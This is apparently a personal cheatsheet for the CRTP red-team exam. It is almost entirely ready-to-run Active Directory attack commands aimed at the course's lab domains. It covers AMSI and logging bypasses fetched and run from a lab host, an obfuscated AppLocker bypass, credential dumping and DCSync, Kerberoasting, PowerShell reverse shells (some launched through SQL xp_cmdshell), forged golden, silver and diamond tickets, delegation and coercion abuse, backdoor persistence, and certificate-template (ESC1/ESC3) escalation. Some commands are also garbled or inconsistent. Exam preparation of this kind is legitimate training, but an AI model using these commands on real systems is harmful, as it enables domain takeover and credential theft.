+++
date = '2026-06-09T17:36:00+01:00'
draft = false
title = 'Certified Red Team Professional (CRTP) - Practical Exam Cheatsheet'
hideToc = false
tags = ['Active Directory', 'Red Teaming', 'CRTP', 'Cheatsheet', 'Commands']
+++

Source: cleaned from `sheet.md` only. Commands were deduplicated where repeated verbatim. No techniques were added beyond the original notes.
## BloodHound Collection
```
./SharpHound.exe --collectionmethods All --excludedcs
```
```
./sharp.xe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs

```
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound\SharpHound.exe -
args --collectionmethods
Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTarg
ets,CertServices --excludedcs

```
## Execution / Session Prep

**PowerShell** Bypass PowerShell execution policy restrictions for the current shell.
```powershell
powershell -ExecutionPolicy bypass
```

**InviShell** Launch InviShell without requiring admin.
```bat
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

## Enumeration

**PowerView** List domain user `samaccountname` values.
```powershell
Get-DomainUser | select -ExpandProperty samaccountname
```

**PowerView** List domain computers by DNS hostname.
```powershell
Get-DomainComputer | select -ExpandProperty dnshostname
```

**PowerView** Get the `Domain Admins` group object.
```powershell
Get-DomainGroup -Identity "Domain Admins"
```

**PowerView** List members of `Domain Admins` in `moneycorp.local`.
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Domain moneycorp.local
```

**PowerView** Enumerate all OUs.
```powershell
Get-DomainOU
```

**PowerView** List OU names only.
```powershell
Get-DomainOU | select -ExpandProperty name
```

**PowerView** List computers inside the `DevOps` OU.
```powershell
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

**PowerView** Enumerate forest domains with verbose output.
```powershell
Get-ForestDomain -Verbose
```

**PowerView** Enumerate domain trusts.
```powershell
Get-DomainTrust
```

**PowerShell** Read the server target list used by later hunting commands.
```powershell
cat C:\AD\Tools\servers.txt
```

**PowerHuntShares** Load the share hunting module.
```powershell
Import-Module C:\AD\Tools\PowerHuntShares.psm1
```

**PowerHuntShares** Hunt SMB shares from a host list and write HTML output.
```powershell
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```

Legend: `-NoPing` skip reachability check, `-OutputDirectory` write results, `-HostList` input targets.

**PowerView** Enumerate ACLs on `Domain Admins` and resolve GUIDs.
```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

**PowerView** Find interesting ACLs referencing `studentx`.
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "causer"}
```

**PowerView** Find interesting ACLs referencing `RDPUsers`.
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

**PowerView** Get the GPO link applied to the `DevOps` OU.
```powershell
(Get-DomainOU -Identity DevOps).gplink
```

**PowerView** Retrieve a GPO by GUID.
```powershell
Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```

**PowerView** Resolve the GPO linked to the `DevOps` OU.
```powershell
Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)
```

**PowerView** Find forest trusts with `FILTER_SIDS`.
```powershell
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

**PowerView** Enumerate trusts in the `eurocorp.local` forest.
```powershell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```

**PowerView** Locate admin sessions after loading PowerView in-memory.
```powershell
Find-DomainUserLocation
```

**SessionHunter** Load the session hunting script.
```powershell
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

**SessionHunter** Hunt sessions on target servers with port scan disabled.
```powershell
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```

**PowerView** Enumerate Kerberoastable users with SPNs.
```powershell
Get-DomainUser -SPN
```

**PowerView** Find computers configured for unconstrained delegation.
```powershell
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

**PowerView** Find users trusted for protocol transition / constrained delegation.
```powershell
Get-DomainUser -TrustedToAuth
```

**PowerView** Find computers trusted for protocol transition / constrained delegation.
```powershell
Get-DomainComputer -TrustedToAuth
```

**PowerUpSQL** Discover SQL instances and gather server info.
```powershell
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

**PowerUpSQL** Crawl linked SQL servers.
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

## Local Privilege Escalation

**PowerUp** Run local privilege escalation checks.
```powershell
Invoke-AllChecks
```

**Loader + winPEAS** Run winPEAS through the loader.
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```

**PrivEscCheck** Load the script.
```powershell
. C:\AD\Tools\PrivEscCheck.ps1
```

**PrivEscCheck** Run the privilege escalation audit.
```powershell
Invoke-PrivescCheck
```

**Find-PSRemotingLocalAdminAccess** Load the local-admin discovery script.
```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

**Find-PSRemotingLocalAdminAccess** Identify hosts where the current user has local admin over PS Remoting.
```powershell
Find-PSRemotingLocalAdminAccess
```

## Defense Evasion / Execution Bypass

**PowerShell** Download and execute the script block logging bypass.
```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/sbloggingbypass.txt')
```

**PowerShell** Download and execute the AMSI bypass.
```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/Amsi-Byp.txt')
```

**PowerShell** Load PowerView in-memory after AMSI bypass.
```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1')
```

**reg** Query AppLocker policy root.
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

**reg** Query a specific AppLocker script rule.
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

## CLM / AppLocker Bypass Technique

1. **Invoke-TheKat** Append the encoded command block to `Invoke-TheKatEx-keys-stdX.ps1`.
```powershell
$jq = "t";
$hk = "o";
$cr = "k";
$dg = "e";
$z3 = "n";
$y4 = ":";
$fq = ":";
$67 = "e";
$qj = "v";
$27 = "a";
$yt = "s";
$ws = "i";
$h4 = "v";
$li = "e";
$tv = "-";
$2h = "e";
$qx = "l";
$lx = "e";
$l1 = "v";
$68 = "a";
$5d = "t";
$ny = "e";
$25 = " ";
$d9 = "s";
$9z = "e";
$8x = "k";
$r2 = "u";
$6x = "r";
$zq = "l";
$06 = "s";
$td = "a";
$hb = ":";
$gz = ":";
$nx = "e";
$0n = "v";
$qz = "a";
$ct = "s";
$mj = "i";
$ue = "v";
$sf = "e";
$2c = "-";
$9u = "e";
$hp = "k";
$x0 = "e";
$yb = "y";
$r1 = "s";
$Pwn = $jq + $hk + $cr + $dg + $z3 + $y4 + $fq + $67 + $qj + $27 + $yt + $ws + $h4 + $li + $tv + $2h + $qx + $lx + $l1 + $68 + $5d + $ny + $25 + $d9 + $9z + $8x + $r2 + $6x + $zq + $06 + $td + $hb + $gz + $nx + $0n + $qz + $ct + $mj + $ue + $sf + $2c + $9u + $hp + $x0 + $yb + $r1 ;

Invoke-TheKat -Command $Pwn
```

2. **PowerShell** Copy the modified script into an allowed path on `dcorp-adminsrv`.
```powershell
Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-stdX.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

3. **PowerShell** Execute the modified script.
```powershell
.\Invoke-TheKatEx-keys-stdX.ps1
```

4. **Invoke-Mimi** Replace the earlier command in the vault variant to query Credential Vault.
```powershell
Invoke-Mimi -Command '"token::evasive-elevate" "vault::cred /patch"'
```

## Credential Access

1. **PowerShell** Download `Loader.exe` to a public path.
```powershell
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

2. **xcopy** Copy `Loader.exe` host-to-host over admin share.
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

**Loader + SafetyKatz** Dump local LSA secrets.
```powershell
C:\Users\TECHSRV30$\Loader.exe -path C:\Users\TECHSRV30$\SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

**Loader + SafetyKatz** Dump Kerberos/NTLM keys from active logon sessions.
```powershell
C:\Tools\Loader.exe -path C:\Tools\SafetyKatz.exe sekurlsa::evasive-keys exit"

```

**Loader + SafetyKatz** DCSync the `krbtgt` account in `dcorp`.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

**Loader + SafetyKatz** Dump trust secrets from a DC.
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

**Loader + SafetyKatz** DCSync the parent-domain `krbtgt`.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

**Loader + SafetyKatz** Get machine-account keys for later RBCD use.
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

## Kerberoasting

1. **Rubeus** Request RC4 roastable hashes for `svcadmin`.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

2. **John the Ripper** Crack the captured service hashes.
```powershell
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

Legend: `/user` target service account, `/simple` simplified output, `/rc4opsec` request only RC4-compatible tickets, `/outfile` save hashes, `--wordlist` cracking wordlist.

## Lateral Movement / Remote Access

**winrs** Open a remote shell on `dcorp-adminsrv`.
```powershell
winrs -r:dcorp-adminsrv cmd
```

**Enter-PSSession** Open an interactive PowerShell remoting session.
```powershell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

**PowerShell** Trigger the reverse shell payload.
```powershell
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

**netcat** Listen for the reverse shell.
```powershell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

**winrs** Confirm remote execution context on the DC.
```powershell
winrs -r:dcorp-dc cmd /c set username
```

## Port Forwarding / Staged Tooling

1. **winrs + netsh** Create a portproxy on `dcorp-mgmt` to relay `8080 -> 172.16.100.x:80`.
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```

2. **winrs + Loader + SafetyKatz** Execute `SafetyKatz.exe` through the local relay.
```powershell
PS $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

## Kerberos Ticket Abuse

**Rubeus** Over-pass-the-hash using an AES256 key and inject the TGT.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Legend: `/user` account, `/aes256` key, `/opsec` safer request mode, `/createnetonly` spawn logon session, `/show` display new process, `/ptt` inject ticket.

**Rubeus** Forge a Golden Ticket and print the final injection command.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

**Rubeus** Forge a Silver Ticket for WinRM over HTTP on the DC.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

**Rubeus** Verify injected tickets.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

**Rubeus** Forge the `HOST` Silver Ticket required for WMI.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

**Rubeus** Forge the `RPCSS` Silver Ticket required for WMI.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

**Rubeus** Create and inject a Diamond Ticket.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Delegation Abuse

### Unconstrained Delegation

1. **xcopy** Copy the loader to the unconstrained-delegation host.
```powershell
echo F | xcopy C:\Tools\Loader.exe \\mgmtsrv\C$\Users\Public\Loader.exe /Y

```

2. **winrs** Open a shell on `dcorp-appsrv`.
```powershell
winrs -r:dcorp-appsrv cmd
```

3. **netsh** Add the local portproxy.
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

4. **Rubeus** Monitor for incoming DC TGT material.
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

5. **MS-RPRN** Coerce the DC to authenticate to the unconstrained host.
```powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

6. **Rubeus** Inject the captured ticket.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…
```

### Coercion Variants

**WSPCoerce** Trigger coercion from `DCORP-DC` to `DCORP-APPSRV`.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```

**DFSCoerce** Trigger coercion via DFS.
```powershell
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

**MS-RPRN** Trigger printer bug coercion.
```powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

### Constrained Delegation

**Rubeus** Abuse user-based constrained delegation via `s4u`.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

**Rubeus** Abuse machine-based constrained delegation and request alternate `ldap` service access.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

Legend: `/impersonateuser` target identity, `/msdsspn` delegated SPN, `/altservice` swap final service class, `/ptt` inject resulting ticket.

## Persistence / Access Maintenance

1. **PowerView** Set RBCD on `dcorp-mgmt` for `dcorp-studentx$`.
```powershell
Set-DomainRBCD -Identity MGMTSRV  -DelegateFrom 'studentvm$' -Verbose

```

2. **Rubeus** Use the machine AES key to request an S4U ticket to `http/dcorp-mgmt`.
```powershell
C:\Tools\Loader.exe -path C:\Tools\ru.exe -args s4u /user:stud$ /aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```
```
C:\Tools\Loader.exe -path C:\Tools\Rubeus.exe -args s4u /user:studvm$ /aes256:bf4aff860f53f53fa911a006c912ea83dce0f0db14e31ee7ff28ec227d746775 /msdsspn:WSMAN/mgmtsrv.tech.corp /impersonateuser:TECHADMIN /ptt

```

3. **winrs** Verify access to `dcorp-mgmt`.
```powershell
winrs -r:mgmtsrv cmd

```

**PowerView** Grant `studentx` DCSync rights on the domain root.
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

**RACE** Load the script used to backdoor remote access.
```powershell
. C:\AD\Tools\RACE.ps1
```

**RACE** Grant `studentx` WMI access on `dcorp-dc`.
```powershell
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

**WMI** Test remote WMI execution.
```powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

**RACE** Grant `studentx` PowerShell remoting access on `dcorp-dc`.
```powershell
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

**PowerShell Remoting** Test remoting access.
```powershell
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

**RACE** Add the remote-registry backdoor for `studentx`.
```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
```

**RACE** Retrieve the remote machine account hash without DA.
```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

## Cross-Domain / Cross-Forest Movement

**Rubeus** Forge an inter-domain trust ticket using the trust key.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

**Rubeus** Request and inject a TGS for `mcorp-dc`.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```

**winrs** Verify access to the parent-domain DC.
```powershell
winrs -r:mcorp-dc.moneycorp.local cmd
```

**Rubeus** Forge a Golden Ticket with extra SID history for Enterprise Admins.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```

**Loader** Copy the loader to the DC before forest trust abuse.
```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

**winrs** Open a shell on `dcorp-dc`.
```powershell
winrs -r:dcorp-dc cmd
```

**netsh** Add the portproxy on `dcorp-dc`.
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

**Rubeus** Forge a referral ticket for the forest trust.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:163373571e6c3e09673010fd60accdf0 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

**Rubeus** Request and inject a `cifs` TGS for `eurocorp-dc`.
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```

**cmd** Access the explicit share on `eurocorp-dc`.
```powershell
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

## SQL Server Abuse

**PowerUpSQL** Execute `xp_cmdshell` through linked SQL servers to test code execution.
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```

**PowerUpSQL** Launch the PowerShell reverse shell via linked SQL execution.
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
```

**netcat** Catch the SQL-triggered reverse shell.
```powershell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```


---

## Active Directory Certificate Services (ADCS) Abuse

### ESC1 - Enterprise Admin (Cross Domain)

**Tool:** Certify → OpenSSL → Rubeus

**Precondition:** Same ESC1 but targeting EA across domain

**Step 1 - Request certificate as EA:**
```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
```

**Step 2 - Convert PEM to PFX:**
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```

**Step 3 - Request TGT using certificate:**
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
```

**Step 4 - Verify access:**
```powershell
winrs -r:mcorp-dc cmd /c set username
```

---

### Parameters Legend

| Parameter | Meaning |
|---|---|
| `/ca` | Certificate Authority path |
| `/template` | Certificate template to abuse |
| `/altname` | Subject Alternative Name to inject |
| `/sid` | SID of the account to impersonate |
| `/certificate` | Path to PFX certificate file |
| `/password` | Password set during PFX export |
| `/ptt` | Pass the ticket - inject into current session |

### ESC3 - Enrollment Agent Abuse

### How ESC3 Works
```
Enroll in an Enrollment Agent certificate template
        ↓
Use that agent cert to request certs ON BEHALF of other users
        ↓
Request cert as DA/EA → get TGT → full access
```

---

### Enumeration
**Tool:** Certify
```powershell
# Find vulnerable templates (look for Enrollment Agent templates)
C:\AD\Tools\Certify.exe find
```

---

### ESC3 - Domain Admin

**Precondition:** Two vulnerable templates exist:
- `SmartCardEnrollment-Agent` - allows enrollment agent
- `SmartCardEnrollment-Users` - allows enroll on behalf of

**Step 1 - Request Enrollment Agent certificate:**
```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

**Step 2 - Convert agent PEM to PFX:**
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

**Step 3 - Request cert on behalf of DA using agent cert:**
```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

**Step 4 - Convert DA PEM to PFX:**
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

**Step 5 - Request TGT as DA:**
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
```

**Step 6 - Verify access:**
```powershell
winrs -r:dcorp-dc cmd
```

---

### ESC3 - Enterprise Admin (Cross Domain)

**Change:** Use `/onbehalfof:mcorp\administrator` instead of `dcorp\administrator`

**Step 1 - Request Enrollment Agent certificate:**
```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

**Step 2 - Convert agent PEM to PFX:**
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

**Step 3 - Request cert on behalf of EA:**
```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

**Step 4 - Convert EA PEM to PFX:**
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx
```

**Step 5 - Request TGT as EA:**
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-EA.pfx /password:SecretPass@123 /ptt
```

**Step 6 - Verify access:**
```powershell
winrs -r:mcorp-dc cmd
```

---

### Parameters Legend

| Parameter | Meaning |
|---|---|
| `/template` | Certificate template to enroll in |
| `/onbehalfof` | Target user to impersonate |
| `/enrollcert` | Path to enrollment agent PFX |
| `/enrollcertpw` | Password of enrollment agent PFX |
| `/certificate` | Path to final PFX for TGT request |
| `/ptt` | Inject ticket into current session |

---

### DA vs EA Difference

| | Domain Admin | Enterprise Admin |
|---|---|---|
| `/onbehalfof` | `dcorp\administrator` | `mcorp\administrator` |
| **Scope** | dcorp domain only | entire forest |
| **Output PFX** | `esc3-DA.pfx` | `esc3-EA.pfx` |
